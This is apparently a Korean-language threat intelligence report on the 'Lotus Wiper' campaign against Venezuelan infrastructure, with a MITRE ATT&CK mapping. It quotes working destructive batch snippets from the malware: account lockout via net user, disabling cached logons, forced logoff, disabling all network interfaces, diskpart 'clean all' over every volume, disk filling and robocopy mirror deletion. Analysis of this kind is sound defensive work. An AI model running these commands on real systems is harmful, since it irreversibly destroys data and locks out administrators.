# [Executive Summary]

본 보고서는 2025년 말부터 2026년 초에 걸쳐 베네수엘라의 핵심 에너지 인프라 및 주요 공공시설 아키텍처를 표적으로 전개된 고도화된 데이터 파괴성 사이버 공격 캠페인 Lotus Wiper에 대한 분석 리포트이다. 해당 침해 사건은 카리브해 지역의 급박한 지정학적 긴장 고조와 밀접하게 맞물려 발생하였으며, 일반적인 위협 그룹의 금전적 이득을 목적으로 하는 랜섬웨어 범죄와 달리 철저한 인프라 마비와 국가 기능 교란을 획득하고자 감행되었다.

공격자는 시스템 진입 후 보안 솔루션의 감시망을 무력화하는 사전 배치 스크립트를 가동한 뒤, 최종 페이로드인 Lotus Wiper를 통해 로컬 시스템의 파일 시스템 파괴는 물론 저장 장치의 마스터 부트 레코드와 물리 디스크 섹터 전체를 제로아웃하여 데이터의 물리적 영구 소멸을 달성하였다. 이는 단순한 정보 유출을 넘어 대상 국가의 국가 기반 시스템을 복구 불가능한 상태로 정지시키기 위해 고도로 기획된 전형적인 사이버 사보타주(Sabotage) 공격의 양상을 보여준다.

# [Technical Analysis]

## 1. Initial Access & Execution

공격 캠페인의 최전방에서 가동되는 최초의 악성 스크립트는 OhSyncNow.bat 파일이다. 이 파일은 시스템 내부로 진입한 즉시 환경 분석을 수행하며 C:\lotus 또는 %SystemDrive%\lotus 경로를 로컬 작업 디렉터리로 식별하고 거점을 마련한다.

이후 악성 스크립트는 도메인 제어 환경 내에서 전파 및 연계 실행을 달성하기 위해 윈도우 인프라의 {% include wiki_link.html text="NETLOGON" url="/review/Details/NETLOGON" %} 공유 폴더 상태를 정밀하게 확인한다. 이 과정에서 도메인 네트워크 경로 상에 배치된 OHSync.xml 파일에 접근을 시도하며, 해당 XML 파일의 존재 여부를 조건부 트리거로 활용한다. 만약 해당 파일이 지정된 로컬 디렉터리에 존재하는 것이 확인되면 후속 배치 파일인 notesreg.bat을 즉시 호출하여 실행하고, 존재하지 않는 경우에는 전사적인 확장을 위해 Active Directory 도메인 구조를 추가로 확인하는 정찰 및 실행 연계 흐름을 보여준다.

최종 파괴 페이로드를 구동하기 위한 후속 실행 단계에서는 정상 서버 애플리케이션의 신뢰 관계를 도용하는 마스커레이딩 기법이 동원된다. 공격자는 Windows용 {% include wiki_link.html text="HCL Domino" url="/review/Details/HCL_Domino" %} 플랫폼의 정상적인 서버 작업 파일로 위장한 nstats.exe를 실행한다. 이 nstats.exe는 실행 시 HCL Domino의 하부 컴포넌트와 유사한 명칭으로 조작된 nevent.exe와 ndesign.exe라는 두 개의 악성 바이너리를 인수로 받아 기동된다. nstats.exe의 실질적인 존재 목적은 보안 솔루션의 감시를 피해 내부에 암호화되어 적재된 최종 와이퍼 실행 파일을 복호화하고 메모리에 복원하여 Lotus Wiper 페이로드를 최종적으로 검색 및 실행시키는 대리 실행체 역할을 수행하는 것이다.

## 2. Persistence & Account Manipulation

지속성 확보 및 방어자 통제권 무력화를 담당하는 notesreg.bat 스크립트는 최초 실행 시 자신의 비정상적인 노출을 차단하기 위해 특정 XML 구성 파일의 존재를 검증하며, 조건이 충족되면 흔적을 남기지 않기 위해 자가 삭제를 수행한다. 그러나 해당 파일이 존재하지 않아 지속적인 침투가 필요하다고 판단될 경우, 시스템 관리자의 접근을 원천 차단하기 위한 파괴적인 계정 조작 행위를 감행한다.

스크립트는 타깃 기업의 IT 부서나 보안 관리 계정으로 추정되는 특정 화이트리스트 이름을 제외한 채, 로컬 시스템에 존재하는 모든 사용자 계정을 순회하며 해당 계정들의 비밀번호를 예측 불가능한 무작위 난수 형태로 강제 변경한다.

```bat
net user %%a %randomPassword% /times:friday,01:00-02:00 /active:no
```

이와 동시에 공격자는 유효한 인증 정보가 없더라도 기존 세션을 통해 로컬 장치에 접근하는 것을 차단하기 위해 Winlogon 레지스트리 값을 직접 조작한다. 시스템이 도메인 컨트롤러와 통신할 수 없을 때 가동되는 캐시 로그인 기능을 강제로 비활성화하기 위해 아래와 같이 `CachedLogonsCount` 데이터를 0으로 강제 변조하는 `reg add` 명령을 실행하여, 관리자가 기존 캐시 자격 증명으로 시스템에 응급 로그인하는 통로를 완전히 봉쇄한다.

```bat
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v CachedLogonsCount /t REG_SZ /d 0 /f
```

## 3. Defense Evasion

Lotus Wiper 캠페인은 초기 침투 단계에서부터 보안 솔루션의 행위 탐지를 회피하고 분석을 교란하기 위해 다중화된 은닉 기술을 전개한다. 먼저 오염된 호스트 내부에서 대화형 서비스가 탐지 필터에 걸리는 것을 막기 위해 Interactive Services Detection 서비스를 무단으로 비활성화한다. 특이하게도 이 서비스는 Windows 10 운영체제 버전부터 공식적으로 제거된 컴포넌트이므로, 본 공격자가 레거시 윈도우 환경이나 구형 서버 아키텍처를 명확한 타깃으로 설정하여 공격을 정밀하게 튜닝했음을 기술적으로 증명하는 지표가 된다.

최종 파괴 바이너리를 은닉하는 과정에서는 고도화된 패킹 및 난독화 전술이 식별된다. 인수로 제공되는 nevent.exe 파일은 전체 코드 영역에 강력한 XOR 암호화가 적용되어 있어 정적 파일 시그니처 감시망을 완벽히 우회하며, 정상 파일로 위장한 nstats.exe에 의해 복호화가 완료된 뒤에야 실질적인 파괴 기능을 가진 ndesign.exe 파일로 메모리에 안전하게 삽입된다.

최종 Lotus Wiper 페이로드가 가동되어 실제 파일 시스템을 파괴하는 단계에서도 고도의 추적 회피 기법이 적용된다. 와이퍼는 파일의 본래 이름과 생성 목적을 완전히 숨겨 사후 포렌식 분석을 차단하고자, 삭제 대상 파일의 명칭을 무작위로 생성된 16진수 문자열 이름으로 강제 변경한 후 `DeleteFileW` 함수를 호출하여 영구 제거한다.

만약 특정 프로세스가 해당 파일을 점유하고 있어 어떤 이유로든 즉각적인 삭제가 실패할 경우, 와이퍼는 파일 잠금 및 접근 제한 걸림돌을 우회하기 위해 `MoveFileExW` 함수를 교차 호출하여 대상 파일을 시스템 내부의 모든 데이터가 소멸하는 특정 위치로 강제 이동시킨다. 이 호출 과정에서 지연 실행 플래그를 설정함으로써, 운영체제가 다음번으로 완전히 재시작되는 시점에 잠금이 해제된 파일이 자동 소멸하도록 예약하는 치밀한 우회 논리를 구사한다.

## 4. Discovery

공격 스크립트와 Lotus Wiper 모듈은 내부 인프라의 가용 자원과 디스크 레이아웃을 완벽하게 파악하여 파괴 효율성을 극대화하고자 전방위적인 디스커버리 작업을 수행한다. 가장 먼저 현재 호스트에서 활성화되어 구동 중인 세션 상태를 식별하기 위해 `qwinsta` 명령을 호출하여 세션 목록을 열거한다. 또한 시스템에 장착된 네트워크 카드 명세와 통신 인터페이스 현황을 파악하기 위해 `netsh interface show interface` 명령을 가동한다.

물리적 파괴 대상을 정밀 매핑하는 단계에서는 관리 도구를 이용한 하부 스토리지 조사를 감행한다. `wmic logicaldisk get Caption` 명령을 실행하여 시스템에 마운트되어 있는 모든 논리 드라이브의 볼륨 식별자를 순회하며 수집한다. 이와 함께 디스크 볼륨을 가짜 데이터로 전량 채워버리는 공간 고갈 공격을 준비하기 위해 `fsutil volume diskfree` 명령을 런타임에 실행하여, 대상 시스템 드라이브 볼륨의 바이트 단위 사용 가능한 여유 공간을 정밀하게 계산하고 변수에 적재한다.

최종 페이로드 단계에서는 윈도우 하부 스토리지 API를 직접 호출하여 로컬 장치를 정찰한다. 와이퍼는 `FindFirstVolumeW` 및 `FindNextVolumeW` 함수를 호출하여 현재 호스트에 마운트된 모든 논리적 볼륨을 하나도 빠짐없이 식별하고 대기열 스레드로 이관한다.

더불어 시스템에 장착된 원시 하드웨어에 직접 접근하기 위해 각 물리적 드라이브의 핸들을 확보한 뒤, `DeviceIoControl` API를 통해 `IOCTL_DISK_GET_DRIVE_GEOMETRY_EX` 제어 코드를 하부 디바이스 드라이버로 전송한다. 이를 통해 대상 하드디스크의 물리적인 드라이브 유형, 총 실린더 수, 실린더당 할당된 트랙 수, 트랙 내부의 섹터 수, 섹터당 물리 바이트 용량 및 디스크 전체의 실제 크기 명세를 완벽히 수집하여 파괴 루틴의 입력값으로 활용한다.

## 5. Impact

### 시스템 복구 기능 무력화 및 환경 고립

Lotus Wiper는 방어자가 백업본이나 시스템 제어권을 이용하여 피해를 복구하는 것을 차단하기 위해 다단계 무력화 공작을 선행한다. 스크립트는 열거된 활성 세션 정보를 바탕으로 사용자가 로그인해 있는 세션 번호를 추적하여 `logoff` 명령을 강제로 밀어 넣음으로써 현재 접속 중인 관리자와 사용자를 시스템에서 강제 로그아웃시킨다.

```bat
for /f "tokens=2,3 delims= " %%a in ('qwinsta') DO ( 
    echo %%a|findstr /xr "[1-9][0-9]* 0" >nul && ( 
    logoff %%a 
    ) 
) 
```

동시에 외부의 엔지니어나 보안 관제 센터에서 원격으로 접속하여 파괴 행위를 제지하거나 패킷을 분석하는 것을 원천 차단하기 위해, 아래와 같이 순회 구문을 통해 호스트에 활성화된 모든 네트워크 인터페이스의 상태를 비활성화로 강제 전환하여 네트워크 망으로부터 시스템을 완전히 고립시킨다.

```bat
for /f "tokens=3*" %%a in ('netsh interface show interface') DO ( 
netsh interface set interface "%%b" DISABLE 
) 
```

가장 치명적인 복구 방해 행위는 시스템 복원 지점의 영구 삭제이다. Lotus Wiper는 시스템 복원 필터 라이브러리인 srclient.dll 파일을 메모리에 동적으로 로드한 후, 내부 프로시저인 `SRSetRestorePoint` 및 `SRRemoveRestorePoint` API를 직접 호출한다. 와이퍼는 먼저 `SRSetRestorePoint`를 호출하여 환경 설정을 변조하는 MODIFY_SETTINGS 유형의 새로운 가짜 복원 지점을 의도적으로 생성하고, 이 과정에서 운영체제가 반환하는 현재 복원 지점의 고유 순번을 확보한다. 해당 순번을 이정표로 삼은 와이퍼는 루프를 돌며 역순으로 `SRRemoveRestorePoint` 프로시저를 연속 호출함으로써, 시스템 내부에 누적되어 있던 정상적인 과거 시스템 복원 지점들을 순차적으로 전량 파괴하여 윈도우 표준 복구 메커니즘을 완전히 무력화한다.

### 전방위적 데이터 및 하드웨어 파괴

Lotus Wiper의 최종 목적은 자산의 영구적인 소멸이다. 스크립트 단계에서는 수집된 논리 드라이브 식별자를 기반으로 윈도우 스토리지 관리 도구인 `diskpart`를 백그라운드에서 동시다발적으로 실행하며 `select volume` 명령과 `clean all` 명령을 체인 형태로 전달한다. 이는 대상 논리 볼륨의 모든 섹터에 예외 없이 00 데이터를 물리적으로 덮어쓰는 제로아웃(Zero-out) 와이핑을 강제 가동하는 것이다.

```bat
for /f "tokens=*" %%V in ('wmic logicaldisk get Caption /value ^| find "Caption="') do (     
    for /f "tokens=2 delims==" %%D in ("%%V") do (         
        start cmd /K "(echo select volume=%%D & echo clean all) | diskpart"     
    ) 
) 
```

시스템 드라이브의 잔여 여유 공간까지 확실하게 소멸시키기 위해 앞서 계산된 여유 공간 용량을 기반으로 `fsutil file createnew` 명령을 실행하여, 디스크가 가득 찰 때까지 무의미한 제로 데이터를 가진 대용량 dummy 파일을 생성하여 가용 저장 공간을 완전히 고갈시킨다.

```bat
%SYSTEMDRIVE%\%MalwareFolder%\fsutil.exe file createnew "%SYSTEMDRIVE%\DiskFillerFile" %FreeDiskBytes% 
```

이와 동시에 시스템의 디렉터리 구조 자체를 파괴하기 위해 robocopy 도구의 미러링 기능을 악용한다. 공격자가 사전에 준비한 텅 비어있는 소스 미러 폴더 구조를 시스템 드라이브 하위의 모든 정상 운영체제 폴더에 대입하고 미러링 플래그를 강제 적용함으로써, 정상적인 프로그램 데이터와 윈도우 핵심 라이브러리 구성 콘텐츠들을 통째로 삭제하고 공백으로 동기화하여 지워버린다.

```bat
FOR /D %%TargetFolder IN ("%SYSTEMDRIVE%\*") DO ( 
    if /I NOT "%%TargetFolder"=="%SYSTEMDRIVE%\%MalwareFolder%" ( 
        start %SYSTEMDRIVE%\%MalwareFolder%\robocopy.exe %SYSTEMDRIVE%\%MalwareFolder%\%SourceMirrorFolder% "%%TargetFolder" /MIR /B /r:0 /w:0 >> nul 2>&1 
    ) 
) 
```

최종적으로 구동된 Lotus Wiper 코어 모듈은 현재 프로세스 토큰이 가질 수 있는 모든 고권한 권한을 최대로 활성화하여 커널 관리자 기능에 접근한다. 와이퍼는 앞서 수집된 물리적 드라이브들의 로우 레벨 핸들을 제어하며 로컬 스토리지의 마스터 부트 레코드(MBR)와 파티션 테이블을 포함한 물리 섹터 전체에 00 데이터를 직접 주입하여 하드웨어를 초기화한다. 물리 디스크 삭제가 완료되면, 시스템 커널 및 파일 시스템 드라이버에 디스크 파티션 테이블 정보가 완전히 파괴되었음을 즉각 반영하고 인지시키기 위해 `IOCTL_DISK_UPDATE_PROPERTIES` 제어 코드를 전송하여 물리적 시스템 붕괴를 확정 짓는다.

동시에 생성된 다중 볼륨 삭제 스레드 내에서는 파일 시스템 추적 기록을 인프라 레벨에서 지우기 위해 볼륨 변경 로그 저장소인 업데이트 시퀀스 번호(USN) 저널로 이동하여, 특정 파일 및 디렉터리와 연계된 모든 저널 레코드를 강제로 완전히 삭제(Flush)한다.

이후 개별 파일 시스템 스캔 루틴을 가동하여 디렉터리가 아닌 일반 파일 개체들을 포착하면, 윈도우 파일 제어 API 명령인 `FSCTL_SET_ZERO_DATA` 제어 코드를 디바이스 드라이버로 전달한다. 이를 통해 해당 파일이 디스크 상에서 차지하고 있던 실제 물리 데이터 영역 블록들을 전부 0으로 재차 채워버림으로써, 하드웨어 섹터부터 최상위 논리 파일 데이터에 이르기까지 그 어떤 포렌식 도구로도 원본 데이터를 다시는 재구성할 수 없도록 완전하고 복구 불가능한 영구 사보타주를 완성한다.

# [MITRE ATT&CK Mapping]

## Initial Access

* **Network Share Discovery** - [T1135](https://attack.mitre.org/techniques/T1135/)
    
    내부망 진입 후 추가 전파 및 실행 연계를 위해 도메인 컨트롤러 환경 내의 NETLOGON 공유 폴더 존재 여부를 정밀 탐색하고 네트워크 경로의 OHSync.xml 파일 접근을 시도함.



## Execution

* **Command and Scripting Interpreter: Windows Command Shell** - [T1059.003](https://attack.mitre.org/techniques/T1059/003/)
    
    공격의 초기 통제 및 환경 설정을 위해 OhSyncNow.bat 및 notesreg.bat 등 복수의 악성 배치 스크립트를 가동하여 후속 파괴 명령을 순차적으로 실행함.

## Persistence

* **Account Manipulation** - [T1098](https://attack.mitre.org/techniques/T1098/)
    
    방어자의 시스템 접근 및 통제권 회복을 원천 차단하기 위해 특정 관리 계정 명세를 제외한 로컬 시스템 내의 모든 사용자 계정 비밀번호를 임의의 무작위 난수로 강제 변조함.

## Defense Evasion

* **Disable or Modify Tools** - [T1562.001](https://attack.mitre.org/techniques/T1562/001/)
    
    대화형 서비스 감시로 인한 악성 행위 적발을 회피하고자 시스템 내부의 Interactive Services Detection 서비스를 무단으로 정지 및 비활성화함.


* **Masquerading: Match Legitimate Name or Location** - [T1036.005](https://attack.mitre.org/techniques/T1036/005/)
    
    최종 파괴 모듈의 정적 시그니처 탐지를 우회하기 위해 정상적인 HCL Domino 플랫폼 서버 컴포넌트 명칭인 nstats.exe, nevent.exe, ndesign.exe 이름을 도용하여 위장함.


* **Obfuscated Files or Information** - [T1027](https://attack.mitre.org/techniques/T1027/)
    
    최종 와이퍼 진입 파일인 nevent.exe의 내부 코드 영역 전체에 강력한 XOR 암호화를 적용하여 보안 가시성을 교란함.


* **Modify Registry** - [T1112](https://attack.mitre.org/techniques/T1112/)
    
    도메인 컨트롤러 불능 상태 시 활용 가능한 응급 로그인 통로를 봉쇄하기 위해 Winlogon 레지스트리 내부의 `CachedLogonsCount` 데이터를 0으로 강제 변경함.


* **Indicator Removal: File Deletion** - [T1070.004](https://attack.mitre.org/techniques/T1070/004/)
    
    침투 흔적을 인위적으로 소멸시키기 위해 notesreg.bat 스크립트 자가 삭제를 수행함. 또한 삭제 대상 파일들을 임의의 16진수 문자열로 개명한 뒤 제거하거나, 프로세스 잠금 우회를 위해 `MoveFileExW` 함수로 파일 이동 후 운영체제 재시작 시점에 소멸하도록 예약 지연시키는 우회 전술을 전개함.



## Discovery

* **System Owner/User Discovery** - [T1033](https://attack.mitre.org/techniques/T1033/)
    
    강제 로그아웃 대상 세션을 식별하고 사용자 활동을 정찰하기 위해 `qwinsta` 명령을 호출하여 시스템 내 활성화된 세션 목록을 열거함.


* **System Network Configuration Discovery** - [T1016](https://attack.mitre.org/techniques/T1016/)
    
    호스트의 네트워크 어댑터 카드 명세 및 활성화된 어댑터 연결 현황을 매핑하기 위해 `netsh interface show interface` 명령을 가동함.


* **System Information Discovery** - [T1082](https://attack.mitre.org/techniques/T1082/)
    
    파괴 대상 스토리지 규모를 파악하기 위해 `wmic logicaldisk`로 논리 볼륨을 순회하고, `fsutil volume diskfree` 명령으로 여유 공간을 계산함. 더불어 `DeviceIoControl` API를 통해 디바이스 드라이버로부터 드라이브 유형, 실린더, 트랙, 섹터 용량 등 물리 디스크의 상세한 하드웨어 구조 명세를 수집함.



## Impact

* **Inhibit System Recovery** - [T1490](https://attack.mitre.org/techniques/T1490/)
    
    보안 분석가의 원격 대응을 차단하기 위해 네트워크 인터페이스를 강제로 비활성화하고 가동 중인 세션을 강제 로그아웃시킴. 또한 표준 복구 메커니즘을 파괴하기 위해 srclient.dll 파일을 로드한 후 `SRSetRestorePoint` 및 `SRRemoveRestorePoint` API 프로시저를 순차 호출하여 시스템에 누적된 과거 복원 지점들을 영구 제거함.


* **Data Destruction** - [T1485](https://attack.mitre.org/techniques/T1485/)
    
    데이터 복구를 완전히 불가능하게 만들기 위해 `diskpart clean all` 명령으로 논리 볼륨 전체를 제로아웃 와이핑하고, `fsutil file createnew` 명령으로 대용량 가짜 파일을 생성하여 디스크 가용 공간을 고갈시킴. 또한 robocopy의 미러링 기능을 악용해 정상 폴더 내용을 공백 구조로 동기화하여 삭제함. 최종적으로 디스크 핸들에 직접 접근하여 마스터 부트 레코드(MBR)와 파티션 테이블을 포함한 물리 섹터 전체를 00 데이터로 덮어쓴 뒤 `IOCTL_DISK_UPDATE_PROPERTIES` 코드로 구조를 붕괴시켰으며, 파일 시스템 영역에서는 업데이트 시퀀스 번호(USN) 저널 레코드를 소멸시키고 `FSCTL_SET_ZERO_DATA` 제어 코드를 호출하여 물리적 데이터 블록들을 완벽히 지워버림.
